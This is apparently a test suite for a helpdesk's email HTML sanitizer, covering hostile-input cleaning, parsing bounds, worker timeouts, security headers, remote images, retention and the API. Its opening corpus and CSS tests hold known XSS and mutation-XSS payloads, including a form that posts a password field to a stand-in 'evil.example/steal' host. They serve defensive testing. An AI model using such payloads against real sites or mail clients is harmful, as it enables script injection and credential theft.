    ["meta refresh, base, stylesheet link", `<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/a.css"><p>after</p>`],
    ["css url and import", `<style>@import url(https://evil.example/x.css);@import "y.css"; body{background:url('https://evil.example/b.png')} .a{b:\\75 rl(https://e.example)} .c{width:expression(alert(1))} .d{behavior:url(x.htc)} .e{background:image-set("a.png" 1x)}</style><div style="background-image:url(https://e.example/x.png);color:red">t</div><div style="b:u\\72l(x)">u</div>`],
    ["form", `<form action="https://evil.example/steal"><input name=password><textarea>t</textarea><select><option>o</option></select><button formaction="https://e.example">Go</button>Text in a form</form>`],
    ["iframe, object, embed", `<iframe src="https://evil.example"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe><object data="x.swf"></object><embed src="x.swf"><applet code=x></applet>`],
    ["nested encodings", `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a><img src="&#x6A;avascript:alert(1)"><div style="background:&#117;rl(https://e.example/a)">y</div><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">z</a>`],
    ["mXSS: noscript", `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`],
    ["mXSS: math/mglyph", `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">`],
    ["mXSS: svg in p", `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`],
    ["mXSS: style break-out", `<style>p::after{content:"</style><img src=x onerror=alert(1)>"}</style>`],
    ["mXSS: template and comments", `<template><img src=x onerror=alert(1)></template><!--<img src=x onerror=alert(1)>--><xmp><img src=x onerror=alert(1)></xmp>`],
    ["data URIs", `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"><img src="data:text/html,<script>alert(1)</script>"><a href="data:image/png;base64,AAAA">p</a>`],
    // The security review's corpus (1.20.8): escapes that decode to escapes, and the rest of its payloads.
    ["review: CSS escape of an escape", `<div style="background:\\5c \\5c 75rl(https://evil.example/a.png)">x</div><style>body{background:\\5c \\5c 75rl(https://evil.example/b.png)}</style>`],
    ["review: @import by escapes", `<style>@\\5c \\5c 69mport "https://evil.example/c.css";</style>`],
    ["review: CSS escape split by a comment", `<div style="background:\\5c 75/**/rl(https://evil.example/a.png)">x</div>`],
    ["review: image-set", `<div style="background-image:-webkit-image-set(url(https://e/x) 1x)">x</div>`],
    ["review: links", `<a href="java&#x09;script:alert(1)">a</a><a href=" JAVASCRIPT:alert(1)">b</a><a href="//evil.example/x">c</a><a href="/desk/x">d</a><a href="https://u:p@e.com">e</a>`],
    ["review: pictures", `<img src="https://e/x.png" srcset="https://e/y 2x"><img src="data:image/svg+xml;base64,PHN2Zz4="><img src="cid:abc"><picture><source srcset="https://e/z"></picture><video poster="https://e/p"></video><input type=image src=https://e/i>`],
    ["review: svg and math styles", `<svg><style><img src=x onerror=alert(1)></style></svg><math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></math>`],
    ["review: area, target, ping, hash", `<map><area href="javascript:alert(1)"><area href="https://ok.example/"></map><a href="https://ok.example" target="_top" rel="opener">x</a><a href="https://ok" ping="https://e/ping">p</a><a href="#x&quot;onclick">h</a><a href="#javascript:alert(1)">h2</a>`],
    ["review: comments and CDATA", `<!--><img src=x onerror=alert(1)>--><p>hi</p><![CDATA[<img src=x onerror=1>]]><table><style>x{}</style><a href="https://ok">t</a></table>`],
    ["review: data URL breaking out", `<img src="data:image/png;base64,AAAA&quot; onerror=alert(1)">`],
  ];

  for (const [name, h] of CORPUS) {
    test(`hostile: ${name}`, async () => {
      const out = (await clean(h)).html;
      inert(out);
    });
  }

  test("what is kept: the email's look, http(s)/mailto/tel links opening a new tab, in-page anchors, tables, safe data: pictures", async () => {
    const out = await bodyOf(
      `<body bgcolor="#f4f4f4"><table width="600" style="border:1px solid #ddd"><tr><td style="font-family:Georgia;color:#333">Hello <b>Ana</b></td></tr></table>` +
        `<a href="https://vendor.example/invoice?id=1">Invoice</a> <a href="mailto:ap@vendor.example">Mail</a> <a href="tel:+441234">Call</a> <a href="#top">Top</a> <a href="/api/helpdesk/tickets">Relative</a>` +
        `<img src="data:image/png;base64,iVBORw0KGgo=" alt="logo"></body>`
    );
    assert.match(out, /<body bgcolor="#f4f4f4">/);
    assert.match(out, /<table width="600" style="border:1px solid #ddd">/);
    assert.match(out, /style="font-family:Georgia;color:#333"/);
    assert.match(out, /<a href="https:\/\/vendor\.example\/invoice\?id=1" target="_blank" rel="noopener noreferrer nofollow" referrerpolicy="no-referrer">Invoice<\/a>/);
    assert.match(out, /<a href="mailto:ap@vendor\.example" target="_blank" rel="noopener noreferrer nofollow"/);
    assert.match(out, /<a href="tel:\+441234" target="_blank"/);
    assert.match(out, /<a href="#top">Top<\/a>/);
    assert.match(out, /<a>Relative<\/a>/, "a relative address would point into the desk: dropped, the text kept");
    assert.match(out, /<img alt="logo" referrerpolicy="no-referrer" src="data:image\/png;base64,iVBORw0KGgo=">/);
  });

  test("the document: a light page, the referrer meta, the email's own style sheet cleaned", async () => {
    const r = await clean(`<html><head><title>T</title><style>.x{color:red;background:url(https://e.example/a.png)}</style></head><body><p class="x">x</p></body></html>`);
    assert.match(r.html, /^<!doctype html>\n<html><head><meta charset="utf-8"><meta name="referrer" content="no-referrer"><style>html\{color-scheme:light;background:#fff/);
    assert.match(r.html, /<style>\.x\{color:red;background:none\}<\/style>/);
    assert.doesNotMatch(r.html, /<title>/);
  });

  test("CSS escapes, comments and nesting cannot hide a URL; an escape of an escape is undone too, and what keeps a backslash goes", () => {
    assert.equal(worker.cleanCss("a{b:u\\72l(x)}"), "a{b:none}");
    assert.equal(worker.cleanCss("a{b:u/**/rl(x)}"), "a{b:u rl(x)}", "a comment splits the word: not a function any more");
    assert.equal(worker.cleanCss("a{b:url(url(x))}"), "a{b:none}");
    assert.equal(worker.cleanCss("a{b:-webkit-image-set(url(a) 1x)}"), "a{b:none}");
    assert.equal(worker.cleanCss("@import 'x.css'; a{c:d}"), "a{c:d}");
    assert.equal(worker.cleanCss("a{content:'</style><script>'}"), "a{content:'\\3c /style>\\3c script>'}");
    assert.equal(worker.cleanCss("a{-moz-binding:url(x.xml#y)} b{behavior:url(x)}"), "a{} b{}");
    // The review's finding: "\5c " is a backslash, so "\5c \5c 75rl(" is "\75rl(" after one round and "url(" after two.
    assert.equal(worker.cleanCss("background:\\5c \\5c 75rl(https://evil/x)"), "background:none");
    assert.equal(worker.cleanCss("body{background:\\5c \\5c 75rl(https://evil/b.png)}"), "body{background:none}");
    // Comments in the way: whatever the rounds leave, no escape and no url( is written out for the browser to read again.
    for (const v of ["background:\\5c 75/**/rl(https://evil/x)", "background:\\5c /**/75rl(x)", "background:\\5c \\5c \\5c 5c 75rl(x)", "background:u\\/**/rl(x)"]) {
      const o = worker.cleanCss(v);
      assert.doesNotMatch(o, /\\|url\(/i, `${v} → ${o}`);
    }
    assert.equal(worker.cleanCss("@\\5c \\5c 69mport 'https://evil/c.css'; a{c:d}"), "a{c:d}");
    // Forty levels deep: undone round after round, never written out.
    const deep = worker.cleanCss("a{color:red;background:" + "\\5c ".repeat(40) + "75rl(x)} b{c:d}");
    assert.doesNotMatch(deep, /\\|url\(/i, deep);
    assert.match(deep, /color:red/);
    // Whatever still holds a backslash after the rounds loses its declaration (the rest of the rule stays).
    assert.equal(worker.cleanCss("a{color:red;b:x\\\ry} c{d:e}"), "a{color:red;} c{d:e}");
    // The worker's version is the one the cache keys on.
    assert.equal(worker.SANITIZER_VERSION, shared.EMAIL_HTML_SANITIZER_VERSION);
    assert.equal(worker.cidKey("<Image001.png%40X>"), sanitize.cidKey("<Image001.png%40X>"));
  });

  test("bounds: measured in one linear pass before parsing; too many elements, attributes, or too deep is refused", async () => {
    const LIM = shared.EMAIL_HTML_LIMITS;
    const refuse = async (h: string, why: string) => {
      assert.equal(sanitize.htmlComplexity(h).over, why, h.slice(0, 40));
      assert.deepEqual(await sanitize.sanitizeEmailHtml(h), { ok: false, reason: "too_complex" });
    };
    await refuse("<div>".repeat(LIM.depth + 5), "depth");
    await refuse("<span>a</span>".repeat(LIM.tags + 5), "elements");
    // The review's payloads: closing tags never opened lower nothing; "/>" opens an ordinary element; attributes are counted.
    await refuse("<div></q>".repeat(59_000), "depth");
    await refuse("<div/>".repeat(LIM.depth + 5), "depth");
    await refuse(`<div ${Array.from({ length: LIM.tagAttrs + 1 }, (_, i) => `a${i}=1`).join(" ")}>x</div>`, "tag_attrs");
    await refuse(`<img ${Array.from({ length: 150 }, (_, i) => `a${i}`).join(" ")}>`.repeat(Math.ceil(LIM.attrs / 150) + 1), "attrs");
    assert.equal((await sanitize.sanitizeEmailHtml("<p>a".repeat(5000))).ok, true, "unclosed paragraphs are no nesting");
    assert.equal((await sanitize.sanitizeEmailHtml("<div>".repeat(300) + "deep enough")).ok, true);
    assert.equal((await sanitize.sanitizeEmailHtml("<svg>" + "<path/>".repeat(1000) + "</svg>")).ok, true, "inside SVG, /> closes");
    // The measuring itself is linear: a megabyte of "<a<a<a" (197 s before the review) is read at once.
    let t0 = Date.now();
    const lt = "<a".repeat(512 * 1024);
    sanitize.htmlComplexity(lt);
    assert.ok(Date.now() - t0 < 1000, `the scan took ${Date.now() - t0} ms`);
    t0 = Date.now();
    const quoted = '<a title="' + "<a ".repeat(300_000);
    sanitize.htmlComplexity(quoted);
    assert.ok(Date.now() - t0 < 1000, "an unclosed quote is one long value, read once");
    t0 = Date.now();
    assert.equal((await sanitize.sanitizeEmailHtml("<style>" + "a{b:url(".repeat(20_000) + "</style>")).ok, true);
    assert.equal((await sanitize.sanitizeEmailHtml(`<div style="${"\\75 rl(".repeat(50_000)}">x</div>`)).ok, true);
    assert.equal((await sanitize.sanitizeEmailHtml("<style>a{b:-" + "a".repeat(500_000) + "}</style>")).ok, true);
    assert.ok(Date.now() - t0 < 6000, "pathological CSS stays fast");
  });

  test("the worker: off the main thread, stopped after its time, the next email gets a fresh one", async () => {
    // The main thread stays free while the worker works: a timer fires during a sanitise.
    let ticks = 0;
    const timer = setInterval(() => ticks++, 5);
    const big = "<span>a</span>".repeat(50_000);
    const r = await sanitize.sanitizeEmailHtml(big);
    clearInterval(timer);
    assert.equal(r.ok, true);
    assert.ok(ticks > 5, `the main thread ran ${ticks} timer ticks meanwhile`);
    // Past its time: refused as a timeout, and the work is stopped.
    sanitize.setSanitizeTimeoutForTests(1);
    try {
      assert.deepEqual(await sanitize.sanitizeEmailHtml(big), { ok: false, reason: "timeout" });
    } finally {
      sanitize.setSanitizeTimeoutForTests(null);
    }
    assert.equal((await sanitize.sanitizeEmailHtml("<p>after</p>")).ok, true, "a fresh worker takes the next email");
    // Several at once: each answered, in turn.
    const all = await Promise.all(Array.from({ length: 5 }, (_, i) => sanitize.sanitizeEmailHtml(`<p>email ${i}</p>`)));
    all.forEach((x, i) => assert.ok(x.ok && x.html.includes(`email ${i}`)));
  });

  test("the route: too complex answers 422 with the sentence, the frame's page says it too", async () => {
    const { first } = await opened(mail(P.req, { html: "<div>".repeat(shared.EMAIL_HTML_LIMITS.depth + 50) + "deep" }));
    const info = await original(first.id, P.agent.session, "?format=info");
    assert.equal(info.status, 422);
    assert.equal(info.body.error, shared.HD_ORIGINAL_COPY.tooComplex);
    const doc = await original(first.id, P.agent.session);
    assert.equal(doc.status, 422);
    assert.match(doc.text, /This email is too complex to show\. Its text is in the conversation\./);
    assert.match(doc.headers.get("content-security-policy") ?? "", /sandbox/);
  });

  test("the route: a sanitise past its time is 422 with the same sentence, and that answer is kept (not worked on again)", async () => {
    const { first } = await opened(mail(P.req, { html: "<p>Slow one</p>" + "<span>a</span>".repeat(20_000) }));
    html.resetOriginalCacheForTests();
    sanitize.setSanitizeTimeoutForTests(1);
    try {
      const info = await call(originalRoute.GET, req(`/messages/${first.id}/original?format=info`, P.agent.session), { id: String(first.id) });
      assert.equal(info.status, 422);
      assert.equal(info.body.error, "This email is too complex to show. Its text is in the conversation.");
    } finally {
      sanitize.setSanitizeTimeoutForTests(null);
    }
    // The frame's read that follows gets the kept answer at once, although the worker would now have time.
    const t0 = Date.now();
    const doc = await call(originalRoute.GET, req(`/messages/${first.id}/original`, P.agent.session), { id: String(first.id) });
    assert.equal(doc.status, 422);
    assert.match(doc.text, /This email is too complex to show/);
    assert.ok(Date.now() - t0 < 500, "kept, not sanitised again");
    // 1.20.11 security review: a refusal is kept for the message, whichever picture choice asks next.
    const other = await call(originalRoute.GET, req(`/messages/${first.id}/original?images=1`, P.agent.session), { id: String(first.id) });
    assert.equal(other.status, 422);
    // Once it is no longer kept, it is worked on again (and succeeds now). A generous limit here:
    // on a loaded CI runner 20,000 elements can take longer than the 3 s production limit.
    html.resetOriginalCacheForTests();
    sanitize.setSanitizeTimeoutForTests(60_000);
    try {
      const shown = await call(originalRoute.GET, req(`/messages/${first.id}/original?images=1`, P.agent.session), { id: String(first.id) });
      assert.equal(shown.status, 200);
      // And a success is kept too: the second read is the same document.
      const again = await call(originalRoute.GET, req(`/messages/${first.id}/original?images=1`, P.agent.session), { id: String(first.id) });
      assert.equal(again.text, shown.text);
    } finally {
      sanitize.setSanitizeTimeoutForTests(null);
    }
  });

  test("the route: images and format may be given once each; a repeated one is 400", async () => {
    const { first } = await opened(mail(P.req, { html: '<p>Twice</p><img src="https://t.example/p.gif">' }));
    for (const q of ["?images=1&images=0", "?images=0&images=1", "?format=info&format=html", "?images=1&format=info&images=1"]) {
      const r = await original(first.id, P.agent.session, q);
      assert.equal(r.status, 400, q);
      assert.ok(!r.text.includes("t.example"), q);
    }
    assert.equal((await original(first.id, P.agent.session, "?images=0")).status, 200);
    assert.doesNotMatch((await original(first.id, P.agent.session, "?images=0")).text, /t\.example/);
  });
});

// --- Arrival: a hostile email can't stall intake ---------------------------------------------------------

describe("arrival", () => {
  test("the text of a hostile or huge HTML-only email is read in bounded time, and the HTML kept is capped", async () => {
    const MB = 1024 * 1024;
    const cases: [string, string][] = [
      ["unclosed nesting (23.7 s before the review)", "<div></q>".repeat(59_000)],
      ["a megabyte of '<a'", "<a".repeat(MB / 2)],
      ["one tag, 20,000 attributes", `<div ${Array.from({ length: 20_000 }, (_, i) => `a${i}=1`).join(" ")}>x</div>`],
      ["two megabytes of paragraphs (over 400 s before)", "<p>word word word</p>".repeat(Math.floor((2 * MB) / 21))],
    ];
    for (const [name, h] of cases) {
      let t0 = Date.now();
      parse.inboundBody({ ...mail(P.req), html: h }, { reply: false });
      assert.ok(Date.now() - t0 < 2000, `${name}: the text took ${Date.now() - t0} ms`);
      t0 = Date.now();
      const { first } = await opened(mail(P.req, { html: h }));
      assert.ok(Date.now() - t0 < 10_000, `${name}: the whole intake took ${Date.now() - t0} ms`);
      const row = await stored(first.id);
      assert.ok(Buffer.byteLength(row.html) <= shared.EMAIL_HTML_LIMITS.storeBytes);
    }
    // Over the limits the text is still there, without a parser.
    assert.equal(parse.htmlToText("<div></q>".repeat(5000) + "<p>Hello &amp; welcome</p><script>x()</script>"), "Hello & welcome");
    // And the 1 MB read for text: what is past it is left out.
    assert.ok(parse.htmlToText("<p>" + "a ".repeat(MB) + "</p><p>tail-marker</p>").length < MB);
  });
});

// --- Pictures --------------------------------------------------------------------------------------

describe("pictures", () => {
  test("remote pictures are hidden by default; Show images allows https only, never http; the policy follows", async () => {
    const { first } = await opened(
      mail(P.req, { html: `<p>Read receipt below.</p><img src="https://track.example/open.gif?u=7" width="1" height="1"><img src="http://plain.example/a.png"><img src="//proto.example/b.png">` })
    );
    const info = await original(first.id, P.agent.session, "?format=info");
    assert.deepEqual(info.body, { ok: true, remote_images: 1, insecure_images: 1, truncated: false, size: info.body.size });
    const hidden = await original(first.id, P.agent.session);
    assert.doesNotMatch(hidden.text, /track\.example|plain\.example|proto\.example/);
    assert.match(hidden.headers.get("content-security-policy")!, /img-src data:;/);
    const shown = await original(first.id, P.agent.session, "?images=1");
    assert.match(shown.text, /<img width="1" height="1" referrerpolicy="no-referrer" src="https:\/\/track\.example\/open\.gif\?u=7">/);
    assert.doesNotMatch(shown.text, /plain\.example|proto\.example/, "http and protocol-relative stay blocked");
    assert.match(shown.headers.get("content-security-policy")!, /img-src data: https:;/);
    assert.equal(shown.headers.get("referrer-policy"), "no-referrer");
  });

  test("cid: pictures come from the same message's own attachments (and a tiny inline logo kept with the HTML); never another message's", async () => {
    const shot = png(6000);
    const logo = png(300);
    const { t, first } = await opened(
      mail(P.req, {
        html: `<p>See:</p><img src="cid:shot1@people.example"><img src="cid:Logo@People.Example"><img src="cid:missing@x">`,
        files: [
          { name: "shot.png", type: "image/png", data: shot, contentId: "shot1@people.example" },
          { name: "logo.png", type: "image/png", data: logo, contentId: "<Logo@People.Example>" },
        ],
      })
    );
    const atts = (await pool().query("SELECT id, filename FROM hd_attachments WHERE message_id = $1", [first.id])).rows;
    assert.deepEqual(atts.map((a) => a.filename), ["shot.png"], "the tiny logo is no attachment (as before 1.20.8)");
    const row = await stored(first.id);
    assert.deepEqual(row.cids["shot1@people.example"], { attachment_id: Number(atts[0].id) });
    assert.deepEqual(row.cids["logo@people.example"], { mime: "image/png", data: logo.toString("base64") });
    const doc = await original(first.id, P.agent.session);
    assert.ok(doc.text.includes(`src="data:image/png;base64,${shot.toString("base64")}"`));
    assert.ok(doc.text.includes(`src="data:image/png;base64,${logo.toString("base64")}"`));
    assert.equal((doc.text.match(/<img referrerpolicy="no-referrer">/g) ?? []).length, 1, "a cid with no match shows nothing");

    // Another ticket's picture: a map pointing at it (however it got there) shows nothing.
    const other = await opened(mail(P.req2, { html: "<p>x</p>", files: [{ name: "secret.png", type: "image/png", data: png(7000), contentId: "secret@x" }] }));
    const secretId = (await pool().query("SELECT id FROM hd_attachments WHERE message_id = $1", [other.first.id])).rows[0].id;
    await pool().query("UPDATE hd_message_html SET cids = $2 WHERE message_id = $1", [first.id, JSON.stringify({ "shot1@people.example": { attachment_id: Number(secretId) } })]);
    const tampered = await original(first.id, P.agent.session);
    assert.ok(!tampered.text.includes("data:image/png;base64,"), "never another message's attachment");
    assert.ok(t.id !== other.t.id);
  });

  test("the response headers of the document", async () => {
    const { first } = await opened(mail(P.req, { html: "<p>Headers</p>" }));
    const r = await original(first.id, P.agent.session);
    assert.equal(r.status, 200);
    assert.equal(
      r.headers.get("content-security-policy"),
      "default-src 'none'; img-src data:; style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'; frame-ancestors 'self'; sandbox allow-popups allow-popups-to-escape-sandbox"
    );
    assert.equal(r.headers.get("x-content-type-options"), "nosniff");
    assert.equal(r.headers.get("referrer-policy"), "no-referrer");
    assert.equal(r.headers.get("cache-control"), "private, no-store");
    assert.equal(r.headers.get("content-type"), "text/html; charset=utf-8");
    const info = await original(first.id, P.agent.session, "?format=info");
    assert.equal(info.headers.get("cache-control"), "private, no-store");
    // next.config.js states the same policy for the path (a config header wins over a route's own on a real server).
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const config = require("../next.config.js") as { headers: () => Promise<{ source: string; has?: unknown[]; headers: { key: string; value: string }[] }[]> };
    const rules = (await config.headers()).filter((h) => h.source === "/api/helpdesk/messages/:id/original");
    const csp = (rule: (typeof rules)[number] | undefined) => rule?.headers.find((x) => x.key === "Content-Security-Policy")?.value;
    assert.equal(csp(rules.find((r) => !r.has)), html.originalHeaders(false)["Content-Security-Policy"]);
    assert.equal(csp(rules.find((r) => r.has)), html.originalHeaders(true)["Content-Security-Policy"]);
    assert.equal(rules.find((r) => !r.has)!.headers.find((x) => x.key === "Referrer-Policy")?.value, "no-referrer");
    const all = await config.headers();
    const at = all.findIndex((h) => h.source === "/api/helpdesk/messages/:id/original");
    assert.ok(at > all.findIndex((h) => h.source === "/((?!addin).*)"), "after the general rule, so it wins");
    // Not audited: reading a message.
    const audits = (await pool().query("SELECT count(*)::int AS n FROM audit_log WHERE actor_id = $1 AND action LIKE '%original%'", [P.agent.id])).rows[0].n;
    assert.equal(audits, 0);
  });
});

// --- Privacy, merge, the API ------------------------------------------------------------------------------

describe("privacy, merge and the API", () => {
  test("anonymising a ticket deletes its originals", async () => {
    const { t, first } = await opened(mail(P.req, { html: "<p>Daniel's personal details</p>" }));
    await deliver(mail(P.req, { subject: `[#${t.number} ref:${t.reply_token}]`, html: "<p>More</p>" }));
    const ids = (await messagesOf(t.id)).map((m) => m.id);
    assert.equal((await pool().query("SELECT count(*)::int AS n FROM hd_message_html WHERE message_id = ANY($1)", [ids])).rows[0].n, 2);
    await dbCore.withTx((c) => retention.anonymiseTicketTx(c, t.id));
    assert.equal((await pool().query("SELECT count(*)::int AS n FROM hd_message_html WHERE message_id = ANY($1)", [ids])).rows[0].n, 0);
    assert.equal((await original(first.id, P.agent.session)).status, 404);
  });

  test("the retention purge (delete) removes them with the ticket, by way of the recycle bin", async () => {
    const { t, first } = await opened(mail(P.req, { html: "<p>Old ticket</p>" }));
    await pool().query("UPDATE hd_tickets SET status = 'closed', closed_at = now() - interval '2 years', solved_at = now() - interval '2 years' WHERE id = $1", [t.id]);
    const settings = { ...retentionShared.HD_RETENTION_DEFAULTS, retention_enabled: true, keep_amount: 1, keep_unit: "months" as const, action: "delete" as const };
    const run = await retention.runRetention({ settings, only: [t.id] });
    assert.deepEqual(run.deleted, [t.id]);
    // "Delete" moves it to the recycle bin first (1.19.4): kept there, unreadable, then purged with the ticket.
    assert.ok(await stored(first.id));
    assert.equal((await original(first.id, P.manager.session)).status, 404);
    await dbCore.withTx((c) => retention.deleteTicketTx(c, t.id));
    assert.equal(await stored(first.id), undefined);
  });

  test("anonymising (retention) a ticket that got an emailed message after it was anonymised removes the new original too", async () => {
    const { t } = await opened(mail(P.req, { html: "<p>First</p>" }));
    const token = t.reply_token;
    await pool().query("UPDATE hd_tickets SET status = 'closed', closed_at = now() - interval '2 years', solved_at = now() - interval '2 years' WHERE id = $1", [t.id]);
    const settings = { ...retentionShared.HD_RETENTION_DEFAULTS, retention_enabled: true, keep_amount: 1, keep_unit: "months" as const, action: "anonymise" as const };
    assert.deepEqual((await retention.runRetention({ settings, only: [t.id] })).anonymised, [t.id]);
    // A message added since (an agent writes on it), then anonymised again.
    await pool().query("UPDATE hd_tickets SET status = 'open', reply_token = $2 WHERE id = $1", [t.id, token]);
    await deliver(mail(P.agent, { subject: `[#${t.number} ref:${token}]`, html: "<p>Added later</p>" }));
    const later = (await messagesOf(t.id)).at(-1)!;
    assert.ok(await stored(later.id));
    await pool().query("UPDATE hd_tickets SET status = 'closed' WHERE id = $1", [t.id]);
    assert.deepEqual((await retention.runRetention({ settings, only: [t.id] })).anonymised, [t.id]);
    assert.equal(await stored(later.id), undefined);
  });

  test("a removed account: the originals of every ticket they asked, were copied on or wrote on go, since other emails quote them", async (t) => {
    if (!(await retention.getRetentionSettings()).anonymise_on_account_removal) return t.skip("this workspace keeps a removed account's tickets (Desk settings → Data retention)");
    const own = await opened(mail(P.leaver, { html: "<p>Lena's own request</p>" }));
    // Copied on Daniel's ticket: her reply, and Daniel's next email quoting her.
    const copied = await opened(mail(P.req, { html: "<p>Daniel's ticket, Lena copied</p>" }));
    await pool().query("INSERT INTO hd_ticket_ccs (ticket_id, user_id, email, name) VALUES ($1, $2, $3, $4)", [copied.t.id, P.leaver.id, P.leaver.email, P.leaver.name]);
    assert.equal((await deliver(mail(P.leaver, { subject: `[#${copied.t.number} ref:${copied.t.reply_token}]`, html: "<p>Lena's reply as a CC</p>" }))).outcome, "appended");
    const quoting = `<p>Agreed.</p><blockquote>Lena Moreau &lt;${P.leaver.email}&gt; wrote: my desk phone is 4471</blockquote>`;
    assert.equal((await deliver(mail(P.req, { subject: `[#${copied.t.number} ref:${copied.t.reply_token}]`, html: quoting }))).outcome, "appended");
    // Wrote on Priya's ticket while copied, and is no longer copied: Priya's email quoting her goes too.
    const wrote = await opened(mail(P.req2, { html: "<p>Priya's ticket</p>" }));
    await pool().query("INSERT INTO hd_ticket_ccs (ticket_id, user_id, email, name) VALUES ($1, $2, $3, $4)", [wrote.t.id, P.leaver.id, P.leaver.email, P.leaver.name]);
    assert.equal((await deliver(mail(P.leaver, { subject: `[#${wrote.t.number} ref:${wrote.t.reply_token}]`, html: "<p>Lena chimes in</p>" }))).outcome, "appended");
    await pool().query("DELETE FROM hd_ticket_ccs WHERE ticket_id = $1", [wrote.t.id]);
    assert.equal((await deliver(mail(P.req2, { subject: `[#${wrote.t.number} ref:${wrote.t.reply_token}]`, html: quoting }))).outcome, "appended");
    // Nothing to do with her: kept.
    const unrelated = await opened(mail(P.req2, { html: "<p>Priya's other ticket</p>" }));
    const ids = async (ticketId: number) => (await messagesOf(ticketId)).map((m) => m.id);
    const related = [...(await ids(own.t.id)), ...(await ids(copied.t.id)), ...(await ids(wrote.t.id))];
    const count = async (list: number[]) => (await pool().query("SELECT count(*)::int AS n FROM hd_message_html WHERE message_id = ANY($1)", [list])).rows[0].n;
    assert.equal(await count(related), 7);
    const done = await dbCore.withTx((c) => retention.anonymiseRemovedAccountTx(c, P.leaver.id));
    assert.ok(done.result);
    assert.equal(await count(related), 0, "her request, the ticket she was copied on and the one she wrote on: every original gone");
    assert.ok(await stored(unrelated.first.id), "a ticket she had nothing to do with keeps its original");
  });

  test("the personal data export carries the HTML of the emails the person sent, never anyone else's", async (t0) => {
    if (!(await retention.getRetentionSettings()).include_in_export) return t0.skip("this workspace leaves the helpdesk out of the export");
    const { t, first } = await opened(mail(P.req2, { html: "<p>Priya's <b>own</b> email</p>" }));
    await deliver(mail(P.agent, { subject: `[#${t.number} ref:${t.reply_token}]`, html: "<p>Agent reply by email</p>" }));
    const exp = await retention.personalHelpdeskExport(P.req2.id);
    const conv = exp.requests.find((r) => r.number === t.number)!.conversation;
    const own = conv.find((c) => c.original_html);
    assert.equal(own?.original_html, "<p>Priya's <b>own</b> email</p>");
    assert.equal(conv.filter((c) => c.original_html).length, 1, "the agent's emailed reply is in the conversation as text only");
    assert.ok(first.id);
  });

  test("merge moves the messages and their originals stay with them", async () => {
    const keep = await opened(mail(P.req, { html: "<p>Keep me</p>" }));
    const gone = await opened(mail(P.req2, { html: "<p>Merge me</p>" }));
    const r = await call(mergeRoute.POST, req("/tickets/merge", P.agent.session, { body: { keep: keep.t.number, merge: [gone.t.number], notify: false } }));
    assert.equal(r.status, 200, r.text);
    const moved = (await pool().query("SELECT ticket_id FROM hd_messages WHERE id = $1", [gone.first.id])).rows[0];
    assert.equal(moved.ticket_id, keep.t.id);
    assert.equal((await stored(gone.first.id)).html, "<p>Merge me</p>");
    const doc = await original(gone.first.id, P.agent.session);
    assert.equal(doc.status, 200);
    assert.match(doc.text, /Merge me/);
  });

  test("API v1: each message says has_original_html; the text body is unchanged and no HTML is served", async () => {
    const { t, first } = await opened(mail(P.req, { html: "<p>API <b>check</b></p>", text: "API check" }));
    const manager = (await dbLib.getUserById(P.manager.id))!;
    const tok = await apiTokens.createApiToken({ name: `${STAMP} reader`, shown_as: `${STAMP} reader`, role: "agent", team_ids: [T1], expires_at: null }, { ...manager, name: manager.name });
    tokenIds.push(tok.view.id);
    const r = await call(
      v1TicketRoute.GET,
      new Request(`http://localhost/api/helpdesk/v1/tickets/${t.number}`, { headers: { authorization: `Bearer ${tok.token}`, "x-forwarded-for": "203.0.113.7" } }),
      { number: String(t.number) }
    );
    assert.equal(r.status, 200, r.text);
    const m = r.body.messages.find((x: { id: number }) => x.id === first.id);
    assert.equal(m.has_original_html, true);
    assert.equal(m.body, "API check");
    assert.ok(!r.text.includes("<b>check</b>"));
    for (const x of r.body.messages) assert.equal(typeof x.has_original_html, "boolean");
  });
});

// --- Upgrade --------------------------------------------------------------------------------------

describe("upgrade", () => {
  test("the table is there after start; a message from before has no original (no control, 404), and nothing is back-filled", async () => {
    const t = (await pool().query("SELECT to_regclass('public.hd_message_html') AS r")).rows[0];
    assert.equal(t.r, "hd_message_html");
    // A ticket as 1.20.7 left it: messages with no row beside them.
    const row = await dbCore.withTx((c) =>
      tickets.insertTicketTx(c, { subject: `${STAMP} from 1.20.7`, body: "Old body", requester: { id: P.req.id, name: P.req.name, email: P.req.email }, team_id: T1, assignee_id: null, tags: [] })
    );
    const [m] = await messagesOf(row.id);
    const d = await call(ticketRoute.GET, req(`/tickets/${row.number}`, P.agent.session), { number: String(row.number) });
    assert.equal(d.body.messages.find((x: { id: number }) => x.id === m.id).has_original_html, false);
    assert.equal((await original(m.id, P.agent.session, "?format=info")).status, 404);
    // Deleting a message takes its original with it (a 1.20.7 rollback that drops tickets is safe too).
    const fresh = await opened(mail(P.req, { html: "<p>Cascade</p>" }));
    await pool().query("DELETE FROM hd_messages WHERE id = $1", [fresh.first.id]);
    assert.equal(await stored(fresh.first.id), undefined);
  });
});
